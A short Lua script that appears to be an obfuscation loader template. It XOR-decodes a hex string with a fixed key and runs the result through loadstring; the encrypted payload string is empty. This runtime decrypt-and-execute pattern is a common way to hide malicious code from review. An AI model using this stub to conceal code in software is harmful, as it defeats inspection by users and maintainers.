local k={75,168,51,147,201,123,231,12,155,80,65,246,176,243,212,15,76,144,60,81,243,97,218,89,69,201,236,64,171,226,65,101}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
